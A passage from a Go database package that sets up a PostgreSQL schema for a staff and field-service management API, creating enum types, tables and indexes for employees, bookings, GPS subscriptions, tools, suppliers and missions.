package database

import (
	"github.com/jmoiron/sqlx"
	"golang.org/x/crypto/bcrypt"

	"staffmange-api/internal/model"
)

// baseSchema ينشئ كل الجداول والأنواع من الصفر لو قاعدة البيانات فاضية — آمن يشتغل
// أكثر من مرة (كل شي IF NOT EXISTS).
var baseSchema = []string{
	// ---- Enums ----
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'ProjectPriority') THEN CREATE TYPE "ProjectPriority" AS ENUM ('NORMAL','URGENT'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'BookingStatus') THEN CREATE TYPE "BookingStatus" AS ENUM ('IN_PROGRESS','PENDING','CONFIRMED','COMPLETED','CANCELLED'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'EquipmentStatus') THEN CREATE TYPE "EquipmentStatus" AS ENUM ('NOT_READY','READY'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'Shift') THEN CREATE TYPE "Shift" AS ENUM ('MORNING','EVENING'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'TechnicianRole') THEN CREATE TYPE "TechnicianRole" AS ENUM ('TECH_1','TECH_2','TECH_3'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'EmployeeStatus') THEN CREATE TYPE "EmployeeStatus" AS ENUM ('ACTIVE','INACTIVE'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'EmployeeRole') THEN CREATE TYPE "EmployeeRole" AS ENUM ('ADMIN','SALES','HR_COORDINATOR','TECHNICIAN','PROJECT_MANAGER','MONITOR','FINANCE','GPS_ADMIN','GPS_ENGINEER','QUALITY_ENGINEER','ENGINEER'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'ExpenseStatus') THEN CREATE TYPE "ExpenseStatus" AS ENUM ('PENDING','APPROVED','REJECTED'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'ToolStatus') THEN CREATE TYPE "ToolStatus" AS ENUM ('AVAILABLE','CHECKED_OUT','DAMAGED'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'ToolRequestStatus') THEN CREATE TYPE "ToolRequestStatus" AS ENUM ('PENDING','APPROVED','REJECTED','RETURNED'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'ComplaintStatus') THEN CREATE TYPE "ComplaintStatus" AS ENUM ('NEW','IN_PROGRESS','RESOLVED','CLOSED'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'SimOperator') THEN CREATE TYPE "SimOperator" AS ENUM ('ZAIN','ASIACELL','KOREK','OTHER'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'SimStatus') THEN CREATE TYPE "SimStatus" AS ENUM ('AVAILABLE','IN_USE'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'GpsRequestStatus') THEN CREATE TYPE "GpsRequestStatus" AS ENUM ('PENDING','APPROVED','REJECTED','DELIVERED'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'GpsPurchaseType') THEN CREATE TYPE "GpsPurchaseType" AS ENUM ('DEVICE_SIM','DEVICE_ONLY'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'GpsSubscriptionType') THEN CREATE TYPE "GpsSubscriptionType" AS ENUM ('THREE_MONTHS','SIX_MONTHS','YEARLY'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'GpsSubscriptionStatus') THEN CREATE TYPE "GpsSubscriptionStatus" AS ENUM ('ACTIVE','EXPIRED','CANCELLED'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'GpsMaintenanceStatus') THEN CREATE TYPE "GpsMaintenanceStatus" AS ENUM ('PENDING','IN_PROGRESS','COMPLETED'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'QuotationStatus') THEN CREATE TYPE "QuotationStatus" AS ENUM ('NEW','SENT','ACCEPTED','REJECTED'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'ProcurementRequestStatus') THEN CREATE TYPE "ProcurementRequestStatus" AS ENUM ('PENDING','IN_PROGRESS','FULFILLED','REJECTED'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'BookingType') THEN CREATE TYPE "BookingType" AS ENUM ('REGULAR','MAINTENANCE'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'BookingUrgency') THEN CREATE TYPE "BookingUrgency" AS ENUM ('ASAP','BY_PRIORITY','SPECIFIC_DATE'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'MaintenanceType') THEN CREATE TYPE "MaintenanceType" AS ENUM ('EXECUTION_ERROR','DEVICE_ISSUE'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'WorkStatus') THEN CREATE TYPE "WorkStatus" AS ENUM ('COMPLETED','STOPPED'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'ProjectSpeed') THEN CREATE TYPE "ProjectSpeed" AS ENUM ('URGENT','INTERNAL','REGULAR','DIRECTOR_REQ'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'WorkType') THEN CREATE TYPE "WorkType" AS ENUM ('FREE_MAINTENANCE','PAID'); END IF; END $$`,
	`DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'MissionStage') THEN CREATE TYPE "MissionStage" AS ENUM ('ASSIGNED','MATERIALS_PREP','MATERIALS_READY','EN_ROUTE','ARRIVED','WORK_STARTED','COMPLETED','STOPPED'); END IF; END $$`,

	// ---- Tables ----
	`CREATE TABLE IF NOT EXISTS "Service" (
		id TEXT PRIMARY KEY,
		name TEXT NOT NULL UNIQUE,
		category TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE TABLE IF NOT EXISTS "TrainingMaterial" (
		id TEXT PRIMARY KEY,
		"serviceId" TEXT NOT NULL REFERENCES "Service"(id) ON DELETE CASCADE,
		title TEXT NOT NULL,
		url TEXT NOT NULL,
		type TEXT NOT NULL DEFAULT 'VIDEO',
		"order" INTEGER NOT NULL DEFAULT 0,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE TABLE IF NOT EXISTS "Customer" (
		id TEXT PRIMARY KEY,
		"customerCode" SERIAL UNIQUE,
		name TEXT NOT NULL,
		phone TEXT NOT NULL UNIQUE,
		location TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE TABLE IF NOT EXISTS "Employee" (
		id TEXT PRIMARY KEY,
		name TEXT NOT NULL,
		certificate TEXT,
		position TEXT,
		phone TEXT,
		status "EmployeeStatus" NOT NULL DEFAULT 'ACTIVE',
		role "EmployeeRole" NOT NULL DEFAULT 'TECHNICIAN',
		"onDuty" BOOLEAN NOT NULL DEFAULT true,
		username TEXT UNIQUE,
		password TEXT,
		"hasDrivingLicense" BOOLEAN NOT NULL DEFAULT false,
		"hasSafetyCertificate" BOOLEAN NOT NULL DEFAULT false,
		salary DOUBLE PRECISION,
		shift "Shift" DEFAULT 'MORNING',
		"monthlyLeaves" INTEGER NOT NULL DEFAULT 2,
		"jobTitle" TEXT,
		"leaderSkillLevel" INTEGER NOT NULL DEFAULT 0,
		"isLeader" BOOLEAN NOT NULL DEFAULT false,
		"isTrainee" BOOLEAN NOT NULL DEFAULT false,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE TABLE IF NOT EXISTS "EmployeeTrainingAssignment" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		"serviceId" TEXT NOT NULL REFERENCES "Service"(id) ON DELETE CASCADE,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		UNIQUE ("employeeId", "serviceId")
	)`,
	`CREATE TABLE IF NOT EXISTS "Skill" (
		id TEXT PRIMARY KEY,
		name TEXT NOT NULL,
		"serviceId" TEXT NOT NULL REFERENCES "Service"(id) ON DELETE CASCADE,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		UNIQUE ("serviceId", name)
	)`,
	`CREATE INDEX IF NOT EXISTS "Skill_serviceId_idx" ON "Skill"("serviceId")`,
	`CREATE TABLE IF NOT EXISTS "EmployeeSkill" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		"skillId" TEXT NOT NULL REFERENCES "Skill"(id) ON DELETE CASCADE,
		"canPerform" BOOLEAN NOT NULL DEFAULT true,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		UNIQUE ("employeeId", "skillId")
	)`,
	`CREATE INDEX IF NOT EXISTS "EmployeeSkill_skillId_idx" ON "EmployeeSkill"("skillId")`,
	`CREATE TABLE IF NOT EXISTS "Booking" (
		id TEXT PRIMARY KEY,
		code TEXT NOT NULL UNIQUE,
		"sequenceNumber" INTEGER,
		"scheduledAt" TIMESTAMP,
		"customerId" TEXT NOT NULL REFERENCES "Customer"(id),
		"serviceId" TEXT REFERENCES "Service"(id),
		notes TEXT,
		"vehicleType" TEXT,
		priority "ProjectPriority" NOT NULL DEFAULT 'NORMAL',
		status "BookingStatus" NOT NULL DEFAULT 'PENDING',
		"transferEmployeeId" TEXT REFERENCES "Employee"(id),
		"transferToProjects" BOOLEAN NOT NULL DEFAULT false,
		"confirmedByName" TEXT,
		"confirmedByEmployeeId" TEXT REFERENCES "Employee"(id),
		"adminNotes" TEXT,
		"equipmentStatus" "EquipmentStatus" NOT NULL DEFAULT 'NOT_READY',
		shift "Shift",
		"deviceCount" INTEGER,
		"inspectionSupervisorId" TEXT REFERENCES "Employee"(id),
		"projectSupervisorId" TEXT REFERENCES "Employee"(id),
		"projectCar" TEXT,
		"crewNotes" TEXT,
		"mapLocation" TEXT,
		"expenseResponsibleId" TEXT REFERENCES "Employee"(id),
		"assignedVehicle" TEXT,
		"quotedPrice" DOUBLE PRECISION,
		address TEXT,
		"completedAt" TIMESTAMP,
		"completionNotes" TEXT,
		"amountCollected" DOUBLE PRECISION,
		"advancePaid" DOUBLE PRECISION,
		"amountVerified" BOOLEAN NOT NULL DEFAULT false,
		"bookingType" "BookingType" NOT NULL DEFAULT 'REGULAR',
		urgency "BookingUrgency",
		"maintenanceType" "MaintenanceType",
		"remembersExecutionCrew" BOOLEAN NOT NULL DEFAULT false,
		"systemCount" INTEGER,
		"systemType" TEXT,
		"projectSpeed" "ProjectSpeed",
		"workType" "WorkType",
		"addressDescription" TEXT,
		"mapLatitude" DOUBLE PRECISION,
		"mapLongitude" DOUBLE PRECISION,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"updatedAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "Booking_customerId_idx" ON "Booking"("customerId")`,
	`CREATE INDEX IF NOT EXISTS "Booking_serviceId_idx" ON "Booking"("serviceId")`,
	`CREATE INDEX IF NOT EXISTS "Booking_status_idx" ON "Booking"(status)`,
	`CREATE TABLE IF NOT EXISTS "BookingAssignment" (
		id TEXT PRIMARY KEY,
		"bookingId" TEXT NOT NULL REFERENCES "Booking"(id) ON DELETE CASCADE,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id),
		role "TechnicianRole" NOT NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		UNIQUE ("bookingId", role)
	)`,
	`CREATE INDEX IF NOT EXISTS "BookingAssignment_employeeId_idx" ON "BookingAssignment"("employeeId")`,
	`CREATE TABLE IF NOT EXISTS "ScheduleChangeLog" (
		id TEXT PRIMARY KEY,
		"bookingId" TEXT NOT NULL REFERENCES "Booking"(id) ON DELETE CASCADE,
		"changedById" TEXT NOT NULL REFERENCES "Employee"(id),
		"oldTime" TIMESTAMP,
		"newTime" TIMESTAMP NOT NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "ScheduleChangeLog_bookingId_idx" ON "ScheduleChangeLog"("bookingId")`,
	`CREATE INDEX IF NOT EXISTS "ScheduleChangeLog_changedById_idx" ON "ScheduleChangeLog"("changedById")`,
	`CREATE TABLE IF NOT EXISTS "Permission" (
		id TEXT PRIMARY KEY,
		name TEXT NOT NULL UNIQUE,
		label TEXT NOT NULL
	)`,
	`CREATE TABLE IF NOT EXISTS "EmployeePermission" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		"permissionId" TEXT NOT NULL REFERENCES "Permission"(id) ON DELETE CASCADE,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		UNIQUE ("employeeId", "permissionId")
	)`,
	`CREATE TABLE IF NOT EXISTS "KpiEvaluation" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id),
		"evaluatorId" TEXT NOT NULL REFERENCES "Employee"(id),
		points INTEGER NOT NULL,
		reason TEXT NOT NULL,
		"deductionAmount" DOUBLE PRECISION NOT NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "KpiEvaluation_employeeId_idx" ON "KpiEvaluation"("employeeId")`,
	`CREATE TABLE IF NOT EXISTS "CartItem" (
		id TEXT PRIMARY KEY,
		"bookingId" TEXT NOT NULL REFERENCES "Booking"(id) ON DELETE CASCADE,
		"productName" TEXT NOT NULL,
		quantity INTEGER NOT NULL,
		"unitPrice" DOUBLE PRECISION NOT NULL,
		"totalPrice" DOUBLE PRECISION NOT NULL,
		notes TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"updatedAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "CartItem_bookingId_idx" ON "CartItem"("bookingId")`,
	`CREATE TABLE IF NOT EXISTS "Expense" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id),
		amount DOUBLE PRECISION NOT NULL,
		description TEXT,
		status "ExpenseStatus" NOT NULL DEFAULT 'PENDING',
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "Expense_employeeId_idx" ON "Expense"("employeeId")`,
	`CREATE TABLE IF NOT EXISTS "PersonalTool" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id),
		name TEXT NOT NULL,
		barcode TEXT NOT NULL UNIQUE,
		status "ToolStatus" NOT NULL DEFAULT 'AVAILABLE',
		"checkedOut" BOOLEAN NOT NULL DEFAULT false,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "PersonalTool_employeeId_idx" ON "PersonalTool"("employeeId")`,
	`CREATE TABLE IF NOT EXISTS "VehicleTool" (
		id TEXT PRIMARY KEY,
		name TEXT NOT NULL,
		barcode TEXT NOT NULL UNIQUE,
		"vehicleId" TEXT NOT NULL,
		status "ToolStatus" NOT NULL DEFAULT 'AVAILABLE',
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "VehicleTool_vehicleId_idx" ON "VehicleTool"("vehicleId")`,
	`CREATE TABLE IF NOT EXISTS "OnDemandTool" (
		id TEXT PRIMARY KEY,
		name TEXT NOT NULL,
		barcode TEXT NOT NULL UNIQUE,
		"totalQuantity" INTEGER NOT NULL,
		"availableQuantity" INTEGER NOT NULL,
		status "ToolStatus" NOT NULL DEFAULT 'AVAILABLE',
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE TABLE IF NOT EXISTS "ToolRequest" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id),
		"toolId" TEXT NOT NULL REFERENCES "OnDemandTool"(id),
		status "ToolRequestStatus" NOT NULL DEFAULT 'PENDING',
		"approvedById" TEXT REFERENCES "Employee"(id),
		"requestedAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"returnedAt" TIMESTAMP
	)`,
	`ALTER TABLE "ToolRequest" ADD COLUMN IF NOT EXISTS "approvedAt" TIMESTAMP`,
	`CREATE INDEX IF NOT EXISTS "ToolRequest_employeeId_idx" ON "ToolRequest"("employeeId")`,
	`CREATE INDEX IF NOT EXISTS "ToolRequest_toolId_idx" ON "ToolRequest"("toolId")`,
	`CREATE TABLE IF NOT EXISTS "Complaint" (
		id TEXT PRIMARY KEY,
		"customerId" TEXT NOT NULL REFERENCES "Customer"(id),
		"bookingId" TEXT REFERENCES "Booking"(id),
		description TEXT NOT NULL,
		status "ComplaintStatus" NOT NULL DEFAULT 'NEW',
		"createdByEmployeeId" TEXT NOT NULL REFERENCES "Employee"(id),
		"assignedToEmployeeId" TEXT REFERENCES "Employee"(id),
		resolution TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"resolvedAt" TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "Complaint_customerId_idx" ON "Complaint"("customerId")`,
	`CREATE INDEX IF NOT EXISTS "Complaint_status_idx" ON "Complaint"(status)`,
	`CREATE TABLE IF NOT EXISTS "GpsCustomer" (
		id TEXT PRIMARY KEY,
		"fullName" TEXT NOT NULL,
		"fatherName" TEXT,
		"grandfatherName" TEXT,
		phone TEXT NOT NULL,
		address TEXT,
		governorate TEXT,
		"idCardFrontUrl" TEXT,
		"idCardBackUrl" TEXT,
		"residenceCardFrontUrl" TEXT,
		"residenceCardBackUrl" TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE TABLE IF NOT EXISTS "SimCard" (
		id TEXT PRIMARY KEY,
		"simNumber" TEXT NOT NULL UNIQUE,
		iccid TEXT,
		operator "SimOperator" NOT NULL,
		status "SimStatus" NOT NULL DEFAULT 'AVAILABLE',
		"customerId" TEXT REFERENCES "GpsCustomer"(id),
		notes TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "SimCard_status_idx" ON "SimCard"(status)`,
	`CREATE TABLE IF NOT EXISTS "GpsDeviceRequest" (
		id TEXT PRIMARY KEY,
		"customerId" TEXT NOT NULL REFERENCES "GpsCustomer"(id),
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id),
		"adminId" TEXT REFERENCES "Employee"(id),
		"purchaseType" "GpsPurchaseType" NOT NULL,
		"subscriptionType" "GpsSubscriptionType" NOT NULL,
		"subscriptionStart" TIMESTAMP,
		"subscriptionEnd" TIMESTAMP,
		"subscriptionStatus" "GpsSubscriptionStatus" NOT NULL DEFAULT 'ACTIVE',
		status "GpsRequestStatus" NOT NULL DEFAULT 'PENDING',
		"simCardId" TEXT REFERENCES "SimCard"(id),
		notes TEXT,
		"isChecked" BOOLEAN NOT NULL DEFAULT false,
		"isActivated" BOOLEAN NOT NULL DEFAULT false,
		"isDelivered" BOOLEAN NOT NULL DEFAULT false,
		"invoicePhotoUrl" TEXT,
		"gpsNumber" TEXT,
		"residenceCardNumber" TEXT,
		"activationDate" TIMESTAMP,
		"deliveredAt" TIMESTAMP,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "GpsDeviceRequest_customerId_idx" ON "GpsDeviceRequest"("customerId")`,
	`CREATE INDEX IF NOT EXISTS "GpsDeviceRequest_status_idx" ON "GpsDeviceRequest"(status)`,
	`CREATE TABLE IF NOT EXISTS "GpsRenewalRequest" (
		id TEXT PRIMARY KEY,
		"customerId" TEXT NOT NULL REFERENCES "GpsCustomer"(id),
		"deviceRequestId" TEXT NOT NULL REFERENCES "GpsDeviceRequest"(id),
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id),
		"adminId" TEXT REFERENCES "Employee"(id),
		"subscriptionType" "GpsSubscriptionType" NOT NULL,
		"newEndDate" TIMESTAMP,
		status "GpsRequestStatus" NOT NULL DEFAULT 'PENDING',
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "GpsRenewalRequest_customerId_idx" ON "GpsRenewalRequest"("customerId")`,
	`CREATE TABLE IF NOT EXISTS "GpsMaintenanceRequest" (
		id TEXT PRIMARY KEY,
		"customerId" TEXT NOT NULL REFERENCES "GpsCustomer"(id),
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id),
		"adminId" TEXT REFERENCES "Employee"(id),
		"problemDescription" TEXT NOT NULL,
		status "GpsMaintenanceStatus" NOT NULL DEFAULT 'PENDING',
		"adminNotes" TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"resolvedAt" TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "GpsMaintenanceRequest_customerId_idx" ON "GpsMaintenanceRequest"("customerId")`,
	`CREATE TABLE IF NOT EXISTS "GpsSubscriptionPrice" (
		id TEXT PRIMARY KEY,
		"subscriptionType" "GpsSubscriptionType" NOT NULL UNIQUE,
		price DOUBLE PRECISION NOT NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE TABLE IF NOT EXISTS "Product" (
		id TEXT PRIMARY KEY,
		name TEXT NOT NULL UNIQUE,
		unit TEXT,
		"defaultPrice" DOUBLE PRECISION,
		"imageBase64" TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE TABLE IF NOT EXISTS "Quotation" (
		id TEXT PRIMARY KEY,
		"quotationNumber" TEXT NOT NULL UNIQUE,
		"customerName" TEXT NOT NULL,
		"customerPhone" TEXT,
		"customerAddress" TEXT,
		"projectName" TEXT,
		"grandTotal" DOUBLE PRECISION NOT NULL DEFAULT 0,
		"discountPercent" DOUBLE PRECISION NOT NULL DEFAULT 0,
		"discountValue" DOUBLE PRECISION NOT NULL DEFAULT 0,
		"netTotal" DOUBLE PRECISION NOT NULL DEFAULT 0,
		notes TEXT,
		duration TEXT,
		status "QuotationStatus" NOT NULL DEFAULT 'NEW',
		"createdByEmployeeId" TEXT NOT NULL REFERENCES "Employee"(id),
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "Quotation_status_idx" ON "Quotation"(status)`,
	`CREATE TABLE IF NOT EXISTS "QuotationItem" (
		id TEXT PRIMARY KEY,
		"quotationId" TEXT NOT NULL REFERENCES "Quotation"(id) ON DELETE CASCADE,
		"productName" TEXT NOT NULL,
		unit TEXT,
		quantity INTEGER NOT NULL,
		"unitPrice" DOUBLE PRECISION NOT NULL,
		"totalPrice" DOUBLE PRECISION NOT NULL
	)`,
	`CREATE INDEX IF NOT EXISTS "QuotationItem_quotationId_idx" ON "QuotationItem"("quotationId")`,
	`CREATE TABLE IF NOT EXISTS "Attendance" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id),
		"checkIn" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"checkOut" TIMESTAMP,
		date TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		UNIQUE ("employeeId", date)
	)`,
	`CREATE INDEX IF NOT EXISTS "Attendance_employeeId_idx" ON "Attendance"("employeeId")`,
	`CREATE INDEX IF NOT EXISTS "Attendance_date_idx" ON "Attendance"(date)`,
	`CREATE TABLE IF NOT EXISTS "WorkReport" (
		id TEXT PRIMARY KEY,
		"bookingId" TEXT NOT NULL REFERENCES "Booking"(id),
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id),
		"workStatus" "WorkStatus" NOT NULL,
		events TEXT,
		"extraRequests" TEXT,
		"cleanedSite" BOOLEAN NOT NULL DEFAULT false,
		"gaveInfo" BOOLEAN NOT NULL DEFAULT false,
		"tookPhotos" BOOLEAN NOT NULL DEFAULT false,
		"stopReason" TEXT,
		notes TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "WorkReport_bookingId_idx" ON "WorkReport"("bookingId")`,
	`CREATE INDEX IF NOT EXISTS "WorkReport_employeeId_idx" ON "WorkReport"("employeeId")`,
	`CREATE TABLE IF NOT EXISTS "Vehicle" (
		id TEXT PRIMARY KEY,
		name TEXT NOT NULL,
		"plateNumber" TEXT NOT NULL UNIQUE,
		color TEXT,
		type TEXT,
		"isActive" BOOLEAN NOT NULL DEFAULT true,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE TABLE IF NOT EXISTS "SupplierSpecialty" (
		id TEXT PRIMARY KEY,
		name TEXT NOT NULL UNIQUE,
		"order" INTEGER NOT NULL DEFAULT 0,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE TABLE IF NOT EXISTS "Supplier" (
		id TEXT PRIMARY KEY,
		"companyName" TEXT NOT NULL,
		"ownerName" TEXT NOT NULL,
		phone TEXT NOT NULL,
		lat DOUBLE PRECISION,
		lng DOUBLE PRECISION,
		"isMaterialSupplier" BOOLEAN NOT NULL DEFAULT false,
		"isContractor" BOOLEAN NOT NULL DEFAULT false,
		"traderTypes" TEXT[] DEFAULT '{}',
		notes TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"updatedAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE TABLE IF NOT EXISTS "SupplierSpecialtyLink" (
		"supplierId" TEXT NOT NULL REFERENCES "Supplier"(id) ON DELETE CASCADE,
		"specialtyId" TEXT NOT NULL REFERENCES "SupplierSpecialty"(id) ON DELETE CASCADE,
		PRIMARY KEY ("supplierId", "specialtyId")
	)`,
	`CREATE TABLE IF NOT EXISTS "SupplierRating" (
		id TEXT PRIMARY KEY,
		"supplierId" TEXT NOT NULL REFERENCES "Supplier"(id) ON DELETE CASCADE,
		value INTEGER NOT NULL,
		note TEXT,
		"ratedById" TEXT NOT NULL REFERENCES "Employee"(id),
		"ratedByName" TEXT NOT NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "SupplierRating_supplierId_idx" ON "SupplierRating"("supplierId")`,
	`CREATE TABLE IF NOT EXISTS "Mission" (
		id TEXT PRIMARY KEY,
		code TEXT NOT NULL UNIQUE,
		"bookingId" TEXT NOT NULL REFERENCES "Booking"(id),
		stage "MissionStage" NOT NULL DEFAULT 'ASSIGNED',
		"leaderId" TEXT NOT NULL,
		"memberIds" TEXT[] DEFAULT '{}',
		"customerLat" DOUBLE PRECISION,
		"customerLng" DOUBLE PRECISION,
		"customerAddress" TEXT,
		"assignedAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"materialsReadyAt" TIMESTAMP,
		"departedAt" TIMESTAMP,
		"arrivedAt" TIMESTAMP,
		"workStartedAt" TIMESTAMP,
		"completedAt" TIMESTAMP,
		"stoppedAt" TIMESTAMP,
		"departureLat" DOUBLE PRECISION,
		"departureLng" DOUBLE PRECISION,
		"arrivalLat" DOUBLE PRECISION,
		"arrivalLng" DOUBLE PRECISION,
		"estimatedMinutes" INTEGER,
		"actualMinutes" INTEGER,
		"distanceKm" DOUBLE PRECISION,
		"stopReason" TEXT,
		notes TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"updatedAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "Mission_bookingId_idx" ON "Mission"("bookingId")`,
	`CREATE INDEX IF NOT EXISTS "Mission_stage_idx" ON "Mission"(stage)`,
	`CREATE INDEX IF NOT EXISTS "Mission_leaderId_idx" ON "Mission"("leaderId")`,
